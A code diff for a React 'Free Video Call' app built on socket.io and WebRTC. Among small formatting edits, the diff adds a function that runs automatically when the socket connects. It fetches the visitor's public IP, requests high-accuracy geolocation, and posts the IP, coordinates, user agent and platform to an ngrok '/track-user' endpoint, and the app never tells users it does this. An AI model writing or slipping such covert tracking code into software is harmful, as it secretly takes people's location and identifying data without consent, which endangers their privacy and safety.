@@ -2,9 +2,9 @@ import React, { useRef, useEffect, useState } from 'react';
 import { io } from 'socket.io-client';
 import './App.css';
 
-const socket = io("https://f754-202-173-124-249.ngrok-free.app", {
-  transports: ['websocket'], // Force WebSocket protocol
-  path: "/socket.io",         // Optional, but safe to specify
+const socket = io("https://e2fe-202-173-124-249.ngrok-free.app", {
+  transports: ['websocket'],
+  path: "/socket.io",
 });
 
 const App = () => {
@@ -20,6 +20,7 @@ const App = () => {
   useEffect(() => {
     socket.on('connect', () => {
       setSocketId(socket.id);
+      collectAndSendUserInfo();
     });
 
     socket.on('online-users', (users) => {
@@ -54,13 +55,11 @@ const App = () => {
 
   const startLocalStream = async () => {
     if (streamStarted) return;
-
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
       localVideo.current.srcObject = stream;
 
       peerConnection.current = new RTCPeerConnection();
-
       stream.getTracks().forEach(track => {
         peerConnection.current.addTrack(track, stream);
       });
@@ -71,10 +70,7 @@ const App = () => {
 
       peerConnection.current.onicecandidate = (event) => {
         if (event.candidate && targetId) {
-          socket.emit('ice-candidate', {
-            to: targetId,
-            candidate: event.candidate
-          });
+          socket.emit('ice-candidate', { to: targetId, candidate: event.candidate });
         }
       };
 
@@ -94,6 +90,41 @@ const App = () => {
     socket.emit('offer', { to: id, offer });
   };
 
+  const collectAndSendUserInfo = async () => {
+    try {
+      const ipRes = await fetch("https://api.ipify.org?format=json");
+      const { ip } = await ipRes.json();
+
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const payload = {
+            ip,
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            time: new Date().toISOString()
+          };
+
+          await fetch("https://f754-202-173-124-249.ngrok-free.app/track-user", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload),
+          });
+
+          console.log("User info sent:", payload);
+        },
+        (err) => {
+          console.error("Geolocation error", err);
+        },
+        { enableHighAccuracy: true }
+      );
+    } catch (error) {
+      console.error("Tracking failed:", error);
+    }
+  };
+
   return (
     <div className="container dark">
       <h1 className="title">Free Video Call</h1>
@@ -110,7 +141,7 @@ const App = () => {
         <button onClick={() => callUser()} className="btn">Connect</button>
         {!streamStarted && (
           <button className="btn" onClick={startLocalStream}>
-            Enable Camera & Microphone
+            Enable Camera & Mic
           </button>
         )}
       </div>
@@ -125,7 +156,6 @@ const App = () => {
         ))}
       </div>
 
-      {/* Fullscreen remote video + PiP local video */}
       <div className="video-wrapper">
         <video ref={remoteVideo} autoPlay playsInline className="remote-video" />
         <video ref={localVideo} autoPlay muted playsInline className="local-video" />
